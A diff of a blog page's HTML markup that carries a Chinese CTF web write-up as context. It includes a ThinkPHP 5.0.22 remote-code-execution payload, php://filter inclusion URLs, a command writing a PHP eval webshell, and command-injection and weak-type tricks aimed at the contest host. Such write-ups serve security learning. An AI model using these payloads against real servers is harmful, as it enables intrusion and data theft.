@@ -5,7 +5,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title class="pjax-title">DMCTF之Web - Braindance</title><meta name="Description" content="Braindance&#39;s blog"><meta property="og:title" content="DMCTF之Web" />
+    <title>DMCTF之Web - Braindance</title><meta name="Description" content="Braindance&#39;s blog"><meta property="og:title" content="DMCTF之Web" />
 <meta property="og:description" content="前言比赛地址：http://dmctf.vaala.cloud:81 这次先写Web题目部分，我最后的排名： Webweak_type源码： 1 2" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.braindance.top/posts/dmctf%E4%B9%8Bweb/" /><meta property="article:section" content="posts" />
@@ -20,7 +20,7 @@
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="https://www.braindance.top/posts/dmctf%E4%B9%8Bweb/" /><link rel="prev" href="https://www.braindance.top/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/" /><link rel="next" href="https://www.braindance.top/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="https://www.braindance.top/posts/dmctf%E4%B9%8Bweb/" /><link rel="prev" href="https://www.braindance.top/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/" /><link rel="next" href="https://www.braindance.top/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -39,14 +39,15 @@
                 "name": "Braindance"
             },"description": ""
     }
-    </script></head>
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
 
 <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
-        function setTheme(theme) { document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); }
-        function saveTheme(theme) { window.localStorage && localStorage.setItem('theme', theme); }
-        function getMeta(metaName) { const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return ''; }
-        if (window.localStorage && localStorage.getItem('theme')) { let theme = localStorage.getItem('theme'); theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light'); }
-        let metaColors = { 'light': '#f8f8f8', 'dark': '#252627', 'black': '#000000' }
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
         getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
     </script>
 
@@ -58,18 +59,18 @@
             <a href="/" title="Braindance">Braindance</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"> 文章 </a><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><a class="menu-item" href="/shuoshuo/" title="说说"> 说说 </a><a class="menu-item" href="/about/" title="关于"> 关于 </a><a class="menu-item" href="/friend/" title="友链"> 友链 </a><a class="menu-item" href="https://travellings.cn" title="开往" rel="noopener noreferrer" target="_blank">🚇 开往 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"> 文章 </a><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><a class="menu-item" href="/about/" title="关于"> 关于 </a><a class="menu-item" href="/friend/" title="友链"> 友链 </a><a class="menu-item" href="https://travellings.cn" title="开往" rel="noopener noreferrer" target="_blank">🚇 开往 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="搜些什么" id="search-input-desktop">
-                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                             <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
                             <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
                             <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
-                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    </span><a href="#" class="menu-item theme-switch" title="切换主题">
                     <i class="fas fa-adjust fa-fw"></i>
                 </a></div>
         </div>
@@ -87,20 +88,20 @@
         <div class="menu" id="menu-mobile"><div class="search-wrapper">
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="搜些什么" id="search-input-mobile">
-                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                             <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
                             <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
                             <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
                     </div>
-                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
                         取消
                     </a>
-                </div><a class="menu-item" href="/posts/" title="文章">文章</a><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a class="menu-item" href="/shuoshuo/" title="说说">说说</a><a class="menu-item" href="/about/" title="关于">关于</a><a class="menu-item" href="/friend/" title="友链">友链</a><a class="menu-item" href="https://travellings.cn" title="开往" rel="noopener noreferrer" target="_blank">🚇开往</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                </div><a class="menu-item" href="/posts/" title="文章">文章</a><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a class="menu-item" href="/about/" title="关于">关于</a><a class="menu-item" href="/friend/" title="友链">友链</a><a class="menu-item" href="https://travellings.cn" title="开往" rel="noopener noreferrer" target="_blank">🚇开往</a><a href="#" class="menu-item theme-switch" title="切换主题">
                 <i class="fas fa-adjust fa-fw"></i>
             </a></div>
     </div>
@@ -164,14 +165,15 @@
             </div><h1 id="前言" class="headerLink">
     <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>比赛地址：<a href="http://dmctf.vaala.cloud:81/" target="_blank" rel="noopener noreferrer">http://dmctf.vaala.cloud:81</a></p>
 <p>这次先写Web题目部分，我最后的排名：</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png">
-    </a></p>
+    </a></figure></p>
 <h1 id="web" class="headerLink">
     <a href="#web" class="header-mark"></a>Web</h1><h2 id="weak_type" class="headerLink">
     <a href="#weak_type" class="header-mark"></a>weak_type</h2><p>源码：</p>
@@ -292,14 +294,15 @@ else{
 <p><strong>完整payload</strong>：</p>
 <p>url: <code>http://dmctf.vaala.cloud:28113/?num=202020020a&amp;v1=QNKCDZO&amp;v2=240610708</code></p>
 <p>post: <code>message=</code></p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png">
-    </a></p>
+    </a></figure></p>
 <h2 id="thinkphp" class="headerLink">
     <a href="#thinkphp" class="header-mark"></a>thinkphp</h2><p>看到框架首先去搜索框架的漏洞，参考了[<a href="https://blog.csdn.net/qq_37865996/article/details/107468816" target="_blank" rel="noopener noreferrer">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p>
 <p>这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p>
@@ -307,14 +310,15 @@ else{
 <p><strong>url</strong>： <code>?s=captcha</code></p>
 <p><strong>post</strong>： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></p>
 <p>虽然报错但是最上方输出了<code>www-data</code></p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png">
-    </a></p>
+    </a></figure></p>
 <p>根据题目中的提示<strong>flag在环境变量中</strong>，所以在网上查询linux系统输出环境变量的语句：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -330,14 +334,15 @@ env
 <p>url： <code>?s=captcha</code></p>
 <p>post： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=env</code></p>
 <p>在输出末尾即是flag。</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png">
-    </a></p>
+    </a></figure></p>
 <h2 id="fungame" class="headerLink">
     <a href="#fungame" class="header-mark"></a>fungame</h2><p>打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。</p>
 <p>我先下了源码到本地康一康，查看源码在<code>game.js</code>中第122行中：</p>
@@ -386,14 +391,15 @@ class PlayerData
 </div>
 </div><p>人物属性值中的<code>health</code>、<code>healthMax</code>、<code>bigBoomerangs</code>数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。</p>
 <p>击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg">
-    </a></p>
+    </a></figure></p>
 <h2 id="bingxie" class="headerLink">
     <a href="#bingxie" class="header-mark"></a>bingxie</h2><p>首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener noreferrer">Behinder</a>，首先下载工具。</p>
 <p>分析题目：</p>
@@ -630,14 +636,15 @@ http://网址/bingxie.php?a=QNKCDZO&amp;b=240610708
 </code></pre></td></tr></table>
 </div>
 </div><p>使用Behinder连接。可以在根目录下找到flag。</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png">
-    </a></p>
+    </a></figure></p>
 <h2 id="filerce" class="headerLink">
     <a href="#filerce" class="header-mark"></a>filerce</h2><p>先看提示：<strong>看看log里面存的什么（利用伪协议包含）</strong>，以下是访问后页面：</p>
 <div class="highlight"><div class="chroma">
@@ -755,14 +762,15 @@ http://网址?file=php://filter/convert.base64-decode/resource=thx.log
 </code></pre></td></tr></table>
 </div>
 </div><p>同样在根目录下找到flag。</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png">
-    </a></p>
+    </a></figure></p>
 <h2 id="do_you_have_a_right_token" class="headerLink">
     <a href="#do_you_have_a_right_token" class="header-mark"></a>do_you_have_a_right_token</h2><p>F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：</p>
 <div class="highlight"><div class="chroma">
@@ -850,14 +858,15 @@ echo time();
 ?&gt;
 </code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png">
+</div><p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png">
-    </a></p>
+    </a></figure></p>
 <p>计算时间差为69，所以修改代码跑一遍：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -882,14 +891,15 @@ date_default_timezone_set(&#39;Asia/Shanghai&#39;);
 </code></pre></td></tr></table>
 </div>
 </div><p>提交本地运行后得到的密文提交上去就可以获得flag。</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png">
-    </a></p>
+    </a></figure></p>
 <h2 id="pingpingping" class="headerLink">
     <a href="#pingpingping" class="header-mark"></a>pingpingping</h2><p>进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener noreferrer">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p>
 <div class="highlight"><div class="chroma">
@@ -903,14 +913,15 @@ date_default_timezone_set(&#39;Asia/Shanghai&#39;);
 </code></pre></td></tr></table>
 </div>
 </div><p>获得flag</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png"
+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png">
-    </a></p>
+    </a></figure></p>
 <h2 id="p3webshell" class="headerLink">
     <a href="#p3webshell" class="header-mark"></a>p3’webshell</h2><p>提示给了一个链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener noreferrer">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p>
 <p>源码：</p>
@@ -950,14 +961,15 @@ command=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[
 </code></pre></td></tr></table>
 </div>
 </div><p>使用蚁剑连接<code>http://网址/shell.php</code>，在根目录里找到flag。</p>
-<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png">
         <img
-            class="lazyload"
-            data-src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png"
-            data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png 2x"
-            data-sizes="auto"
+            
+            loading="lazy"
+            src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png"
